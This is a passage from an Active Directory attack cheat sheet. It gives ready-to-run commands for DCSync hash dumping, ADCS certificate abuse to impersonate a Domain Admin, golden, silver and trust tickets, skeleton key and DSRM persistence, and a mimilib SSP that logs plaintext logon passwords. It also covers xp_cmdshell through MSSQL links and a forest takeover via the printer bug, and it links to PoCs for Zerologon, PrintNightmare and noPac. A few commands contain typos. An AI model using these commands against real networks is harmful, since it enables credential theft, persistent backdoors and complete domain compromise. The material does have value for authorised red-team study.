<a href="#__codelineno-52-19" id="__codelineno-52-19" name="__codelineno-52-19"></a><span class="c">#Or DCsync and dump the hashes using mimikatz</span>
<a href="#__codelineno-52-20" id="__codelineno-52-20" name="__codelineno-52-20"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">all</span>
</code></pre></div> <p>Detailed Articles:</p> <ul> <li><a href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></li> <li><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li> </ul> <h3 id="exploiting-sharepoint">Exploiting SharePoint<a class="headerlink" href="#exploiting-sharepoint" title="Permanent link"></a></h3> <ul> <li><a href="https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d">CVE-2019-0604</a> RCE Exploitation \ <a href="https://github.com/k8gege/CVE-2019-0604">PoC</a></li> <li><a href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization">CVE-2019-1257</a> Code execution through BDC deserialization</li> <li><a href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters">CVE-2020-0932</a> RCE using typeconverters \ <a href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932">PoC</a></li> </ul> <h3 id="zerologon">Zerologon<a class="headerlink" href="#zerologon" title="Permanent link"></a></h3> <ul> <li><a href="https://www.secura.com/whitepapers/zerologon-whitepaper">Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</li> <li><a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon">SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li> <li><a href="https://github.com/BC-SECURITY/Invoke-ZeroLogon">Invoke-ZeroLogon</a>: PowerShell implementation of the Zerologon exploit.</li> <li><a href="https://github.com/bb00/zer0dump">Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</li> </ul> <h3 id="printnightmare">PrintNightmare<a class="headerlink" href="#printnightmare" title="Permanent link"></a></h3> <ul> <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527">CVE-2021-34527</a>: Vulnerability details.</li> <li><a href="https://github.com/cube0x0/CVE-2021-1675">Impacket implementation of PrintNightmare</a>: Reliable PoC of PrintNightmare using the impacket library.</li> <li><a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">C# Implementation of CVE-2021-1675</a>: Reliable PoC of PrintNightmare written in C#.</li> </ul> <h3 id="active-directory-certificate-services">Active Directory Certificate Services<a class="headerlink" href="#active-directory-certificate-services" title="Permanent link"></a></h3> <p><strong>Check for Vulnerable Certificate Templates with:</strong> <a href="https://github.com/GhostPack/Certify">Certify</a></p> <p><em>Note: Certify can be executed with Cobalt Strike's <code>execute-assembly</code> command as well</em></p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-53-1" id="__codelineno-53-1" name="__codelineno-53-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span> <span class="p">/</span><span class="n">quiet</span>
</code></pre></div> <p>Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.</p> <p>This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA") and use the captured certificate with Rubeus to forge authentication.</p> <p><em>Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.</em></p> <p>Request the DA's Account Certificate with Certify</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-54-1" id="__codelineno-54-1" name="__codelineno-54-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">template</span><span class="p">:&lt;</span><span class="n">Template</span> <span class="n">Name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="s2">"&lt;CA Name&gt;"</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=&lt;</span><span class="n">domain</span><span class="p">&gt;,</span><span class="n">DC</span><span class="p">=</span><span class="n">com</span> <span class="p">/</span><span class="n">altname</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Admin</span> <span class="n">AltName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">machine</span>
</code></pre></div> <p>This should return a valid certificate for the associated DA account.</p> <p>The exported <code>cert.pem</code> and <code>cert.key</code> files must be consolidated into a single <code>cert.pem</code> file, with one gap of whitespace between the <code>END RSA PRIVATE KEY</code> and the <code>BEGIN CERTIFICATE</code>.</p> <p><em>Example of <code>cert.pem</code>:</em></p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-55-1" id="__codelineno-55-1" name="__codelineno-55-1"></a>-----BEGIN RSA PRIVATE KEY-----
<a href="#__codelineno-55-2" id="__codelineno-55-2" name="__codelineno-55-2"></a>BIIEogIBAAk15x0ID[...]
<a href="#__codelineno-55-3" id="__codelineno-55-3" name="__codelineno-55-3"></a>[...]
<a href="#__codelineno-55-4" id="__codelineno-55-4" name="__codelineno-55-4"></a>[...]
<a href="#__codelineno-55-5" id="__codelineno-55-5" name="__codelineno-55-5"></a>-----END RSA PRIVATE KEY-----
<a href="#__codelineno-55-6" id="__codelineno-55-6" name="__codelineno-55-6"></a>
<a href="#__codelineno-55-7" id="__codelineno-55-7" name="__codelineno-55-7"></a>-----BEGIN CERTIFICATE-----
<a href="#__codelineno-55-8" id="__codelineno-55-8" name="__codelineno-55-8"></a>BIIEogIBOmgAwIbSe[...]
<a href="#__codelineno-55-9" id="__codelineno-55-9" name="__codelineno-55-9"></a>[...]
<a href="#__codelineno-55-10" id="__codelineno-55-10" name="__codelineno-55-10"></a>[...]
<a href="#__codelineno-55-11" id="__codelineno-55-11" name="__codelineno-55-11"></a>-----END CERTIFICATE-----
</code></pre></div> <h1 id="utilize-openssl-to-convert-to-pkcs-12-format">Utilize <code>openssl</code> to Convert to PKCS <a class="magiclink magiclink-github magiclink-issue" href="https://github.com/squidfunk/mkdocs-material/issues/12" title="GitHub Issue: squidfunk/mkdocs-material #12">#12</a> Format<a class="headerlink" href="#utilize-openssl-to-convert-to-pkcs-12-format" title="Permanent link"></a></h1> <p>The <code>openssl</code> command can be utilized to convert the certificate file into PKCS <a class="magiclink magiclink-github magiclink-issue" href="https://github.com/squidfunk/mkdocs-material/issues/12" title="GitHub Issue: squidfunk/mkdocs-material #12">#12</a> format (you may be required to enter an export password, which can be anything you like).</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-56-1" id="__codelineno-56-1" name="__codelineno-56-1"></a>openssl pkcs12 -in cert.pem -keyex -CSP <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -export -out cert.pfx
</code></pre></div> <p>Once the <code>cert.pfx</code> file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, <code>certutil.exe</code>, Cobalt Strike's upload functionality, etc.)</p> <p>After the <code>cert.pfx</code> file has been uploaded to the compromised host, <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> can be used to request a Kerberos TGT for the DA account which will then be imported into memory.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-57-1" id="__codelineno-57-1" name="__codelineno-57-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktht</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Admin</span> <span class="n">AltName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Controller</span> <span class="n">IP</span> <span class="n">or</span> <span class="n">Hostname</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:&lt;</span><span class="n">Local</span> <span class="n">Machine</span> <span class="n">Path</span> <span class="n">to</span> <span class="n">cert</span><span class="p">.</span><span class="n">pfx</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div> <p>This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.</p> <h3 id="no-pac">No PAC<a class="headerlink" href="#no-pac" title="Permanent link"></a></h3> <ul> <li><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountname Spoofing</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li> <li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">Weaponisation of CVE-2021-42287/CVE-2021-42278</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li> <li><a href="https://github.com/cube0x0/noPac">noPAC</a> C# tool to exploit CVE-2021-42278 and CVE-2021-42287</li> <li><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a> Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287</li> <li><a href="https://github.com/Ridter/noPac">noPac</a> Evolution of "sam-the-admin" tool</li> </ul> <h2 id="domain-persistence">Domain Persistence<a class="headerlink" href="#domain-persistence" title="Permanent link"></a></h2> <h3 id="golden-ticket-attack">Golden Ticket Attack<a class="headerlink" href="#golden-ticket-attack" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-58-1" id="__codelineno-58-1" name="__codelineno-58-1"></a><span class="c">#Execute mimikatz on DC as DA to grab krbtgt hash:</span>
<a href="#__codelineno-58-2" id="__codelineno-58-2" name="__codelineno-58-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"lsadump::lsa /patch"'</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="s1">'sName&gt;</span>
<a href="#__codelineno-58-3" id="__codelineno-58-3" name="__codelineno-58-3"></a>
<a href="#__codelineno-58-4" id="__codelineno-58-4" name="__codelineno-58-4"></a><span class="s1">#On any machine:</span>
<a href="#__codelineno-58-5" id="__codelineno-58-5" name="__codelineno-58-5"></a><span class="s1">Invoke-Mimikatz -Command '</span><span class="s2">"kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:</span>
<a href="#__codelineno-58-6" id="__codelineno-58-6" name="__codelineno-58-6"></a><span class="s2">&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="err">'</span>
</code></pre></div> <h3 id="dcsync-attack">DCsync Attack<a class="headerlink" href="#dcsync-attack" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-59-1" id="__codelineno-59-1" name="__codelineno-59-1"></a><span class="c">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):</span>
<a href="#__codelineno-59-2" id="__codelineno-59-2" name="__codelineno-59-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;"'</span>
<a href="#__codelineno-59-3" id="__codelineno-59-3" name="__codelineno-59-3"></a>
<a href="#__codelineno-59-4" id="__codelineno-59-4" name="__codelineno-59-4"></a><span class="c">#DCsync using secretsdump.py from impacket with NTLM authentication</span>
<a href="#__codelineno-59-5" id="__codelineno-59-5" name="__codelineno-59-5"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;/&lt;</span><span class="n">Username</span><span class="p">&gt;:&lt;</span><span class="n">Password</span><span class="p">&gt;@&lt;</span><span class="n">DC</span><span class="s1">'S IP or FQDN&gt; -just-dc-ntlm</span>
<a href="#__codelineno-59-6" id="__codelineno-59-6" name="__codelineno-59-6"></a>
<a href="#__codelineno-59-7" id="__codelineno-59-7" name="__codelineno-59-7"></a><span class="s1">#DCsync using secretsdump.py from impacket with Kerberos Authentication</span>
<a href="#__codelineno-59-8" id="__codelineno-59-8" name="__codelineno-59-8"></a><span class="s1">secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC'</span><span class="n">S</span> <span class="n">IP</span> <span class="n">or</span> <span class="n">FQDN</span><span class="p">&gt;</span> <span class="n">-just-dc-ntlm</span>
</code></pre></div> <p><strong>Tip:</strong> ptt -&gt; inject ticket on current running session ticket -&gt; save the ticket on the system for later use</p> <h3 id="silver-ticket-attack">Silver Ticket Attack<a class="headerlink" href="#silver-ticket-attack" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-60-1" id="__codelineno-60-1" name="__codelineno-60-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:</span>
<a href="#__codelineno-60-2" id="__codelineno-60-2" name="__codelineno-60-2"></a><span class="s1">&lt;ServiceType&gt; /rc4:&lt;TheSPN'</span><span class="n">s</span> <span class="n">Account</span> <span class="n">NTLM</span> <span class="n">Hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserToImpersonate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span><span class="s2">"'</span>
</code></pre></div> <p><a href="https://adsecurity.org/?page_id=183">SPN List</a></p> <h3 id="skeleton-key-attack">Skeleton Key Attack<a class="headerlink" href="#skeleton-key-attack" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-61-1" id="__codelineno-61-1" name="__codelineno-61-1"></a><span class="c">#Exploitation Command runned as DA:</span>
<a href="#__codelineno-61-2" id="__codelineno-61-2" name="__codelineno-61-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"privilege::debug" "misc::skeleton"'</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="err">'</span><span class="n">s</span> <span class="n">FQDN</span><span class="p">&gt;</span>
<a href="#__codelineno-61-3" id="__codelineno-61-3" name="__codelineno-61-3"></a>
<a href="#__codelineno-61-4" id="__codelineno-61-4" name="__codelineno-61-4"></a><span class="c">#Access using the password "mimikatz"</span>
<a href="#__codelineno-61-5" id="__codelineno-61-5" name="__codelineno-61-5"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">AnyMachineYouLike</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;\</span><span class="n">Administrator</span>
</code></pre></div> <h3 id="dsrm-abuse">DSRM Abuse<a class="headerlink" href="#dsrm-abuse" title="Permanent link"></a></h3> <p><em>What's that?</em> Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-62-1" id="__codelineno-62-1" name="__codelineno-62-1"></a><span class="c">#Dump DSRM password (needs DA privs):</span>
<a href="#__codelineno-62-2" id="__codelineno-62-2" name="__codelineno-62-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"token::elevate" "lsadump::sam"'</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="s1">'s Name&gt;</span>
<a href="#__codelineno-62-3" id="__codelineno-62-3" name="__codelineno-62-3"></a>
<a href="#__codelineno-62-4" id="__codelineno-62-4" name="__codelineno-62-4"></a><span class="s1">#This is a local account, so we can PTH and authenticate!</span>
<a href="#__codelineno-62-5" id="__codelineno-62-5" name="__codelineno-62-5"></a><span class="s1">#BUT we need to alter the behaviour of the DSRM account before pth:</span>
<a href="#__codelineno-62-6" id="__codelineno-62-6" name="__codelineno-62-6"></a><span class="s1">#Connect on DC:</span>
<a href="#__codelineno-62-7" id="__codelineno-62-7" name="__codelineno-62-7"></a><span class="s1">Enter-PSSession -ComputerName &lt;DC'</span><span class="n">s</span> <span class="n">Name</span><span class="p">&gt;</span>
<a href="#__codelineno-62-8" id="__codelineno-62-8" name="__codelineno-62-8"></a>
<a href="#__codelineno-62-9" id="__codelineno-62-9" name="__codelineno-62-9"></a><span class="c">#Alter the Logon behaviour on registry:</span>
<a href="#__codelineno-62-10" id="__codelineno-62-10" name="__codelineno-62-10"></a><span class="nb">New-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="n">-Name</span> <span class="s2">"DsrmAdminLogonBehaviour"</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span> <span class="n">-Verbose</span>
<a href="#__codelineno-62-11" id="__codelineno-62-11" name="__codelineno-62-11"></a>
<a href="#__codelineno-62-12" id="__codelineno-62-12" name="__codelineno-62-12"></a><span class="c">#If the property already exists:</span>
<a href="#__codelineno-62-13" id="__codelineno-62-13" name="__codelineno-62-13"></a><span class="nb">Set-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="n">-Name</span> <span class="s2">"DsrmAdminLogonBehaviour"</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-Verbose</span>
</code></pre></div> <p>Then just PTH to get local admin access on DC!</p> <h3 id="custom-ssp">Custom SSP<a class="headerlink" href="#custom-ssp" title="Permanent link"></a></h3> <p><em>What's that?</em> We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</p> <p>From powershell:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-63-1" id="__codelineno-63-1" name="__codelineno-63-1"></a><span class="c">#Get current Security Package:</span>
<a href="#__codelineno-63-2" id="__codelineno-63-2" name="__codelineno-63-2"></a><span class="nv">$packages</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\"</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span>  <span class="s1">'Security Packages'</span>
<a href="#__codelineno-63-3" id="__codelineno-63-3" name="__codelineno-63-3"></a>
<a href="#__codelineno-63-4" id="__codelineno-63-4" name="__codelineno-63-4"></a><span class="c">#Append mimilib:</span>
<a href="#__codelineno-63-5" id="__codelineno-63-5" name="__codelineno-63-5"></a><span class="nv">$packages</span> <span class="p">+=</span> <span class="s2">"mimilib"</span>
<a href="#__codelineno-63-6" id="__codelineno-63-6" name="__codelineno-63-6"></a>
<a href="#__codelineno-63-7" id="__codelineno-63-7" name="__codelineno-63-7"></a><span class="c">#Change the new packages name</span>
<a href="#__codelineno-63-8" id="__codelineno-63-8" name="__codelineno-63-8"></a><span class="nb">Set-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\"</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span> <span class="n">-Value</span> <span class="nv">$packages</span>
<a href="#__codelineno-63-9" id="__codelineno-63-9" name="__codelineno-63-9"></a><span class="nb">Set-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="n">-Name</span> <span class="s1">'Security Packages'</span> <span class="n">-Value</span> <span class="nv">$packages</span>
<a href="#__codelineno-63-10" id="__codelineno-63-10" name="__codelineno-63-10"></a>
<a href="#__codelineno-63-11" id="__codelineno-63-11" name="__codelineno-63-11"></a><span class="c">#ALTERNATIVE:</span>
<a href="#__codelineno-63-12" id="__codelineno-63-12" name="__codelineno-63-12"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"misc::memssp"'</span>
</code></pre></div> <p>Now all logons on the DC are logged to -&gt; C:\Windows\System32\kiwissp.log</p> <h2 id="cross-forest-attacks">Cross Forest Attacks<a class="headerlink" href="#cross-forest-attacks" title="Permanent link"></a></h2> <h3 id="trust-tickets">Trust Tickets<a class="headerlink" href="#trust-tickets" title="Permanent link"></a></h3> <p><em>What's that?</em> If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</p> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/26a0.svg" title=":warning:"/> The access we will have will be limited to what our DA account is configured to have on the other Forest!</p> <ul> <li>Using Mimikatz:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-64-1" id="__codelineno-64-1" name="__codelineno-64-1"></a><span class="c">#Dump the trust key</span>
<a href="#__codelineno-64-2" id="__codelineno-64-2" name="__codelineno-64-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"lsadump::trust /patch"'</span>
<a href="#__codelineno-64-3" id="__codelineno-64-3" name="__codelineno-64-3"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"lsadump::lsa /patch"'</span>
<a href="#__codelineno-64-4" id="__codelineno-64-4" name="__codelineno-64-4"></a>
<a href="#__codelineno-64-5" id="__codelineno-64-5" name="__codelineno-64-5"></a><span class="c">#Forge an inter-realm TGT using the Golden Ticket attack</span>
<a href="#__codelineno-64-6" id="__codelineno-64-6" name="__codelineno-64-6"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:</span>
<a href="#__codelineno-64-7" id="__codelineno-64-7" name="__codelineno-64-7"></a><span class="s1">&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:</span>
<a href="#__codelineno-64-8" id="__codelineno-64-8" name="__codelineno-64-8"></a><span class="s1">&lt;PathToSaveTheGoldenTicket&gt;"'</span>
</code></pre></div> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/2757.svg" title=":exclamation:"/> Tickets -&gt; .kirbi format</p> <p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p> <ul> <li>Using Rubeus:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-65-1" id="__codelineno-65-1" name="__codelineno-65-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">kirbi</span> <span class="n">file</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="s2">"Service's SPN"</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div> <h3 id="abuse-mssql-servers">Abuse MSSQL Servers<a class="headerlink" href="#abuse-mssql-servers" title="Permanent link"></a></h3> <ul> <li>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></li> <li>Check Accessibility as current user:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-66-1" id="__codelineno-66-1" name="__codelineno-66-1"></a><span class="nb">Get-SQLConnectionTestThreaded</span>
<a href="#__codelineno-66-2" id="__codelineno-66-2" name="__codelineno-66-2"></a><span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
</code></pre></div> <ul> <li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li> <li>Abusing SQL Database Links: \ <em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></li> </ul> <p>Check for existing Database Links:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-67-1" id="__codelineno-67-1" name="__codelineno-67-1"></a><span class="c">#Check for existing Database Links:</span>
<a href="#__codelineno-67-2" id="__codelineno-67-2" name="__codelineno-67-2"></a><span class="c">#PowerUpSQL:</span>
<a href="#__codelineno-67-3" id="__codelineno-67-3" name="__codelineno-67-3"></a><span class="nb">Get-SQLServerLink</span> <span class="n">-Instance</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a href="#__codelineno-67-4" id="__codelineno-67-4" name="__codelineno-67-4"></a>
<a href="#__codelineno-67-5" id="__codelineno-67-5" name="__codelineno-67-5"></a><span class="c">#MSSQL Query:</span>
<a href="#__codelineno-67-6" id="__codelineno-67-6" name="__codelineno-67-6"></a><span class="nb">select </span><span class="p">*</span> <span class="n">from</span> <span class="n">master</span><span class="p">..</span><span class="n">sysservers</span>
</code></pre></div> <p>Then we can use queries to enumerate other links from the linked Database:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-68-1" id="__codelineno-68-1" name="__codelineno-68-1"></a><span class="c">#Manualy:</span>
<a href="#__codelineno-68-2" id="__codelineno-68-2" name="__codelineno-68-2"></a><span class="nb">select </span><span class="p">*</span> <span class="n">from</span> <span class="n">openquery</span><span class="p">(</span><span class="s2">"LinkedDatabase"</span><span class="p">,</span> <span class="s1">'select * from master..sysservers'</span><span class="p">)</span>
<a href="#__codelineno-68-3" id="__codelineno-68-3" name="__codelineno-68-3"></a>
<a href="#__codelineno-68-4" id="__codelineno-68-4" name="__codelineno-68-4"></a><span class="c">#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):</span>
<a href="#__codelineno-68-5" id="__codelineno-68-5" name="__codelineno-68-5"></a><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instance</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a href="#__codelineno-68-6" id="__codelineno-68-6" name="__codelineno-68-6"></a>
<a href="#__codelineno-68-7" id="__codelineno-68-7" name="__codelineno-68-7"></a><span class="c">#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell</span>
<a href="#__codelineno-68-8" id="__codelineno-68-8" name="__codelineno-68-8"></a><span class="c">#Or if it is disabled enable it:</span>
<a href="#__codelineno-68-9" id="__codelineno-68-9" name="__codelineno-68-9"></a><span class="n">EXECUTE</span><span class="p">(</span><span class="s1">'sp_configure "xp_cmdshell",1;reconfigure;'</span><span class="p">)</span> <span class="n">AT</span> <span class="s2">"SPN"</span>
</code></pre></div> <p>Query execution:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-69-1" id="__codelineno-69-1" name="__codelineno-69-1"></a><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instace</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Query</span> <span class="s2">"exec master..xp_cmdshell 'whoami'"</span>
</code></pre></div> <h3 id="breaking-forest-trusts">Breaking Forest Trusts<a class="headerlink" href="#breaking-forest-trusts" title="Permanent link"></a></h3> <p><em>What's that?</em> TL;DR \ If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.</p> <p>Tools we are going to use:</p> <ul> <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li> <li><a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a></li> <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li> </ul> <p>Exploitation example:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-70-1" id="__codelineno-70-1" name="__codelineno-70-1"></a><span class="c">#Start monitoring for TGTs with rubeus:</span>
<a href="#__codelineno-70-2" id="__codelineno-70-2" name="__codelineno-70-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">5</span> <span class="p">/</span><span class="n">filteruser</span><span class="p">:</span><span class="n">target-dc</span><span class="p">$</span>
<a href="#__codelineno-70-3" id="__codelineno-70-3" name="__codelineno-70-3"></a>
<a href="#__codelineno-70-4" id="__codelineno-70-4" name="__codelineno-70-4"></a><span class="c">#Execute the printerbug to trigger the force authentication of the target DC to our machine</span>
<a href="#__codelineno-70-5" id="__codelineno-70-5" name="__codelineno-70-5"></a><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">target-dc</span><span class="p">$.</span><span class="n">external</span><span class="p">.</span><span class="n">forest</span><span class="p">.</span><span class="n">local</span> <span class="n">dc</span><span class="p">.</span><span class="n">compromised</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a href="#__codelineno-70-6" id="__codelineno-70-6" name="__codelineno-70-6"></a>
<a href="#__codelineno-70-7" id="__codelineno-70-7" name="__codelineno-70-7"></a><span class="c">#Get the base64 captured TGT from Rubeus and inject it into memory:</span>
